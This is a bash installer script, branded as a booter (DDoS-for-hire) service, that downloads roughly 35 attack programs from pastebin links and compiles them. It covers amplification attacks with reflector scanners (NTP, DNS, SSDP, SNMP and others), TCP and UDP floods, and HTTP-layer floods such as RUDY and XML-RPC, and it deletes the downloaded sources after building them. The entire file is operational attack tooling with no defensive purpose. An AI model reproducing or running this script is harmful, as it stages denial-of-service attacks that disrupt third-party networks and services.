#!/bin/bash

#
#    Installed Methods:
#      NTP Amplification & Scanner
#      SSDP Amplification & Scanner
#      DNS Amplification & Scanner
#      CHARGEN Amplification & Scanner
#      SNMPv2 Amplification & Scanner
#      Sentinel Amplification  & Scanner
#      NetBIOS Amplification & Scanner
#      MSSQL Amplification & Scanner
#      TS3 Amplification & Scanner
#      DB2 Amplification
#      PORTMAP Amplification & Scanner
#      UDP
#      VSE
#      Spoofed Telnet
#      Home Connection Flood
#      TCP-SE
#      TCP-ACK
#      TCP-RST
#      TCP-PSH
#      TCP-FIN
#      TCP-XMAS
#      WIZARD
#      DOMINATE
#      ZAP
#      SSYN
#      ESSYN
#      ISSYN
#      XSYN
#      HTTP-GET
#      HTTP-HEAD
#      HTTP-POST
#      RUDY
#      ARME
#      XML-RPC
#
#
#    2016-05-03: Initial version, tested with Ubuntu 15.04

if [ $# != 1 ]; then
echo "Script Wget & Compiler (35 Methods)"
echo "Option 1: sh $0 -all / Downloads All Attack Scripts"
echo "Option 2: sh $0 -udp / Downloads All UDP Scripts"
echo "Option 3: sh $0 -tcp / Downloads All TCP Scripts"
echo "Option 4: sh $0 -amp / Downloads All Amplification Scripts"
echo "Option 5: sh $0 -layer7 / Downloads All Layer 7 Scripts"
echo "Option Help: sh $0 -h"
exit 0
fi
while test $# -gt 0; do
        case "$1" in
                -all|-a)
				echo "Making UDP Amplification Directory...."
				mkdir amp
				mkdir amplists
				cd amp
				echo "Downloading UDP Amplification Files..."
				wget -q http://pastebin.com/raw/vpbXuKVA -O ssdp.c
				gcc -o ssdp ssdp.c -pthread
				wget -q http://pastebin.com/raw/7uNYKs4c -O ssdpscan.c
				gcc -o ssdpscan ssdpscan.c -pthread
				wget -q http://pastebin.com/raw/PJeYk4Bc -O ntp.c
				gcc -o ntp ntp.c -pthread
				wget -q http://pastebin.com/raw/XWFfm5hh -O ntpscan.c
				gcc -o ntpscan ntpscan.c -pthread
				wget -q http://pastebin.com/raw/JV9nCf6U -O dns.c
				gcc -o dns dns.c -pthread
				wget -q http://pastebin.com/raw/ASH2DYqq -O dnsscan.c
				gcc -o dnsscan dnsscan.c -pthread
				wget -q http://pastebin.com/raw/Kktvq2pz -O chargen.c
				gcc -o chargen chargen.c -pthread
				wget -q http://pastebin.com/raw/FpeqRp6K -O chargenscan.c
				gcc -o chargenscan chargenscan.c -pthread
				wget -q http://pastebin.com/raw/7LXZXPWf -O snmp.c
				gcc -o snmp snmp.c -pthread
				wget -q http://pastebin.com/raw/EtCTaqG1 -O snmpscan.c
				gcc -o snmpscan snmpscan.c -pthread
				wget -q http://pastebin.com/raw/jmPdAPPM -O sentinel.c
				gcc -o sentinel sentinel.c -pthread
				wget -q http://pastebin.com/raw/gX0waM82 -O sentinelscan.c
				gcc -o sentinelscan sentinelscan.c -pthread
				wget -q http://pastebin.com/raw/D0UFWXmU -O netbios.c
				gcc -o netbios netbios.c -pthread
				wget -q http://pastebin.com/raw/V6jTyjbi -O netbiosscan.c
				gcc -o netbiosscan netbiosscan.c -pthread
				wget -q http://pastebin.com/raw/RsYN9wYs -O mssql.c
				gcc -o mssql mssql.c -pthread
				wget -q http://pastebin.com/raw/3MT59SGE -O mssqlscan.c
				gcc -o mssqlscan mssqlscan.c -pthread
				wget -q http://pastebin.com/raw/LAb0nSbh -O ts3.c
				gcc -o ts3 ts3.c -pthread
				wget -q http://pastebin.com/raw/bgraxVGt -O ts3scan.c
				gcc -o ts3scan ts3scan.c -pthread
				wget -q http://pastebin.com/raw/PNDMd2CF -O db2.c
				gcc -o db2 db2.c -pthread
				wget -q http://pastebin.com/raw/Fuza6KEM -O db2scan.c
				gcc -o db2scan db2scan.c -pthread
				wget -q http://pastebin.com/raw/PNDMd2CF -O portmap.c
				gcc -o portmap portmap.c -pthread
				wget -q http://pastebin.com/raw/LH6yB0Yt -O portmapscan.c
				gcc -o portmapscan portmapscan.c -pthread
				echo "Deleting Original UDP Amplification Files..."
				rm -rf *.c
				echo "Bringing you back..."
				cd ..
				echo "Making UDP Directory...."
				mkdir udp
				cd udp
				echo "Downloading UDP Files..."
				wget -q http://pastebin.com/raw/56gXh8pj -O udp.c
				gcc -o udp udp.c -pthread
				wget -q http://pastebin.com/raw/9v26VXgV -O vse.c
				gcc -o vse vse.c -pthread
				wget -q http://pastebin.com/raw/y6hAsCMv -O telnet.c
				gcc -o telnet telnet.c -pthread
				wget -q http://pastebin.com/raw/56gXh8pj -O home.c
				gcc -o home home.c -pthread
				rm -rf *.c
				echo "Bringing you back..."
				cd ..
				echo "Making TCP Directory...."
				mkdir tcp
				cd tcp
				echo "Downloading TCP Files..."
				wget -q http://pastebin.com/raw/zGVUysHm -O tcp.c
				gcc -o tcp tcp.c -pthread
				wget -q http://pastebin.com/raw/exeZXy6r -O tcp-se.c
				gcc -o tcp-se tcp-se.c -pthread
				wget -q http://pastebin.com/raw/qCj51SVR -O tcp-ack.c
				gcc -o tcp-ack tcp-ack.c -pthread
				wget -q http://pastebin.com/raw/PBYH8KBA -O tcp-rst.c
				gcc -o tcp-rst tcp-rst.c -pthread
				wget -q http://pastebin.com/raw/mgKMrs57 -O tcp-psh.c
				gcc -o tcp-psh tcp-psh.c -pthread
				wget -q http://pastebin.com/raw/KtWhv2mA -O tcp-fin.c
				gcc -o tcp-fin tcp-fin.c -pthread
				wget -q http://pastebin.com/raw/FLQUPnC5 -O tcp-xmas.c
				gcc -o tcp-xmas tcp-xmas.c -pthread
				wget -q http://pastebin.com/raw/QqczTvAz -O wizard.c
				gcc -o wizard wizard.c -pthread
				wget -q http://pastebin.com/raw/dR2pEeiq -O dominate.c
				gcc -o dominate dominate.c -pthread
				wget -q http://pastebin.com/raw/ciXtfx3Z -O zap.c
				gcc -o zap zap.c -pthread
				wget -q http://pastebin.com/raw/nSHZqeRX -O ssyn.c
				gcc -o ssyn ssyn.c -pthread
				wget -q http://pastebin.com/raw/Y2G7vCjn -O essyn.c
				gcc -o essyn essyn.c -pthread
				wget -q http://pastebin.com/raw/xhBJyJEb -O issyn.c
				gcc -o issyn issyn.c -pthread
				wget -q http://pastebin.com/raw/2CfHqZj9 -O xsyn.c
				gcc -o xsyn xsyn.c -pthread
				wget -q http://pastebin.com/raw/zfSbVHDy -O zsyn.c
				gcc -o zsyn zsyn.c -pthread
				wget -q http://pastebin.com/raw/7MU1viQf -O csyn.c
				gcc -o csyn csyn.c -pthread
				rm -rf *.c
				echo "Bringing you back..."
				cd ..
				echo "Making Layer 7 Directory...."
				mkdir l7
				cd l7
				echo "Downloading Layer 7 Files..."
				wget -q http://pastebin.com/raw/sJURi2ST -O ghp.c
				gcc -o ghp ghp.c -pthread
				wget -q http://pastebin.com/raw/sJURi2ST -O rudy.c
				gcc -o rudy rudy.c -pthread
				wget -q http://pastebin.com/raw/dAbj8HvY -O arme.c
				gcc -o arme arme.c -pthread
				wget -q http://pastebin.com/raw/dAbj8HvY -O xmlrpc.c
				gcc -o xmlrpc xmlrpc.c -pthread
				echo "Deleting Original Files..."
				rm -rf *.c
				echo "Bringing you back..."
				cd ..
				exit 0
                        ;;
				-udp|-u)
				echo "Making Directory...."
				mkdir udp
				cd udp
				echo "Downloading Files..."
				wget -q http://pastebin.com/raw/56gXh8pj -O udp.c
				gcc -o udp udp.c -pthread
				wget -q http://pastebin.com/raw/9v26VXgV -O vse.c
				gcc -o vse vse.c -pthread
				wget -q http://pastebin.com/raw/y6hAsCMv -O telnet.c
				gcc -o telnet telnet.c -pthread
				wget -q http://pastebin.com/raw/x2eanwSi -O home.c
				gcc -o home home.c -pthread
				rm -rf *.c
				exit 0
                        ;;
				-tcp|-t)
				echo "Making Directory...."
				mkdir tcp
				cd tcp
				echo "Downloading Files..."
				wget -q http://pastebin.com/raw/zGVUysHm -O tcp.c
				gcc -o tcp tcp.c -pthread
				wget -q http://pastebin.com/raw/exeZXy6r -O tcp-se.c
				gcc -o tcp-se tcp-se.c -pthread
				wget -q http://pastebin.com/raw/qCj51SVR -O tcp-ack.c
				gcc -o tcp-ack tcp-ack.c -pthread
				wget -q http://pastebin.com/raw/PBYH8KBA -O tcp-rst.c
				gcc -o tcp-rst tcp-rst.c -pthread
				wget -q http://pastebin.com/raw/mgKMrs57 -O tcp-psh.c
				gcc -o tcp-psh tcp-psh.c -pthread
				wget -q http://pastebin.com/raw/KtWhv2mA -O tcp-fin.c
				gcc -o tcp-fin tcp-fin.c -pthread
				wget -q http://pastebin.com/raw/FLQUPnC5 -O tcp-xmas.c
				gcc -o tcp-xmas tcp-xmas.c -pthread
				wget -q http://pastebin.com/raw/QqczTvAz -O wizard.c
				gcc -o wizard wizard.c -pthread
				wget -q http://pastebin.com/raw/dR2pEeiq -O dominate.c
				gcc -o dominate dominate.c -pthread
				wget -q http://pastebin.com/raw/ciXtfx3Z -O zap.c
				gcc -o zap zap.c -pthread
				wget -q http://pastebin.com/raw/nSHZqeRX -O ssyn.c
				gcc -o ssyn ssyn.c -pthread
				wget -q http://pastebin.com/raw/Y2G7vCjn -O essyn.c
				gcc -o essyn essyn.c -pthread
				wget -q http://pastebin.com/raw/xhBJyJEb -O issyn.c
				gcc -o issyn issyn.c -pthread
				wget -q http://pastebin.com/raw/2CfHqZj9 -O xsyn.c
				gcc -o xsyn xsyn.c -pthread
				rm -rf *.c
				exit 0
						;;
				-amp|-A)
				echo "Making Directory...."
				mkdir amp
				mkdir amplists
				cd amp
				echo "Downloading Files..."
				wget -q http://pastebin.com/raw/vpbXuKVA -O ssdp.c
				gcc -o ssdp ssdp.c -pthread
				wget -q http://pastebin.com/raw/7uNYKs4c -O ssdpscan.c
				gcc -o ssdpscan ssdpscan.c -pthread
				wget -q http://pastebin.com/raw/PJeYk4Bc -O ntp.c
				gcc -o ntp ntp.c -pthread
				wget -q http://pastebin.com/raw/XWFfm5hh -O ntpscan.c
				gcc -o ntpscan ntpscan.c -pthread
				wget -q http://pastebin.com/raw/JV9nCf6U -O dns.c
				gcc -o dns dns.c -pthread
				wget -q http://pastebin.com/raw/ASH2DYqq -O dnsscan.c
				gcc -o dnsscan dnsscan.c -pthread
				wget -q http://pastebin.com/raw/Kktvq2pz -O chargen.c
				gcc -o chargen chargen.c -pthread
				wget -q http://pastebin.com/raw/FpeqRp6K -O chargenscan.c
				gcc -o chargenscan chargenscan.c -pthread
				wget -q http://pastebin.com/raw/7LXZXPWf -O snmp.c
				gcc -o snmp snmp.c -pthread
				wget -q http://pastebin.com/raw/EtCTaqG1 -O snmpscan.c
				gcc -o snmpscan snmpscan.c -pthread
				wget -q http://pastebin.com/raw/jmPdAPPM -O sentinel.c
				gcc -o sentinel sentinel.c -pthread
				wget -q http://pastebin.com/raw/gX0waM82 -O sentinelscan.c
				gcc -o sentinelscan sentinelscan.c -pthread
				wget -q http://pastebin.com/raw/D0UFWXmU -O netbios.c
				gcc -o netbios netbios.c -pthread
				wget -q http://pastebin.com/raw/V6jTyjbi -O netbiosscan.c
				gcc -o netbiosscan netbiosscan.c -pthread
				wget -q http://pastebin.com/raw/RsYN9wYs -O mssql.c
				gcc -o mssql mssql.c -pthread
				wget -q http://pastebin.com/raw/3MT59SGE -O mssqlscan.c
				gcc -o mssqlscan mssqlscan.c -pthread
				wget -q http://pastebin.com/raw/LAb0nSbh -O ts3.c
				gcc -o ts3 ts3.c -pthread
				wget -q http://pastebin.com/raw/bgraxVGt -O ts3scan.c
				gcc -o ts3scan ts3scan.c -pthread
				wget -q http://pastebin.com/raw/PNDMd2CF -O db2.c
				gcc -o db2 db2.c -pthread
				wget -q http://pastebin.com/raw/Fuza6KEM -O db2scan.c
				gcc -o db2scan db2scan.c -pthread
				wget -q http://pastebin.com/raw/PNDMd2CF -O portmap.c
				gcc -o portmap portmap.c -pthread
				wget -q http://pastebin.com/raw/LH6yB0Yt -O portmapscan.c
				gcc -o portmapscan portmapscan.c -pthread
				echo "Deleting Original Files..."
				rm -rf *.c
				exit 0
						;;
				-layer7|--l7)
				echo "Making Directory...."
				mkdir l7
				cd l7
				echo "Downloading Files..."
				wget -q http://pastebin.com/raw/sJURi2ST -O ghp.c
				gcc -o ghp ghp.c -pthread
				wget -q http://pastebin.com/raw/sJURi2ST -O rudy.c
				gcc -o rudy rudy.c -pthread
				wget -q http://pastebin.com/raw/dAbj8HvY -O arme.c
				gcc -o arme arme.c -pthread
				wget -q http://pastebin.com/raw/dAbj8HvY -O xmlrpc.c
				gcc -o xmlrpc xmlrpc.c -pthread
				echo "Deleting Original Files..."
				rm -rf *.c
				exit 0
						;;
				-h|--help)
					echo "BOOTER.SU - Script Wget & Compiler (35 Methods)"
					echo "Option -all : Download all UDP/TCP/AMP Scripts"
					echo "Option -udp : Download All UDP Scripts"
					echo "Option -tcp : Download All TCP Scripts"
					echo "Option -amp : Download All Amplified Scripts"
					echo "Option -layer7 : Download All Layer 7 Scripts"
					exit 0
						;;
                *)
					echo "Invalid Option. Exiting."
                    exit 0
                        ;;
        esac
done